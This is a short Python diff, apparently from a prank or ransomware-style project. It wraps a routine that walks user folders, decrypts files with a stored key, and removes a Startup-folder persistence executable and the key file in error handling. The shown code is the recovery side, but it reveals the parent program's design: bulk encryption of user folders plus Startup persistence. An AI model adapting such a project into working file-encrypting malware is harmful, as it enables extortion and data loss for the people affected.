@@ -55,13 +55,17 @@ if __name__ == '__main__':
         os.remove("C:\\Users\\"+usuario+"\\Appdata\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\launchersusto.exe")
     except:
         print("no se borró startup")
-    key = load_key()
-    for carpeta in carpetasAencriptar:
-        for ruta, directorios, archivos in os.walk(carpeta):
-            for archivo in archivos:
-                if archivo not in nomelotoques:
-                    archivo_ruta = os.path.join(ruta, archivo)
-                    decrypt(archivo_ruta,key)
+    try:
+        key = load_key()
+        for carpeta in carpetasAencriptar:
+            for ruta, directorios, archivos in os.walk(carpeta):
+                for archivo in archivos:
+                    if archivo not in nomelotoques:
+                        archivo_ruta = os.path.join(ruta, archivo)
+                        decrypt(archivo_ruta,key)
+    except Exception as e:
+        print(e)
+        print("Se cambiará solo el fondo")
     try:
         os.remove(docs+"\\key.key")
     except:
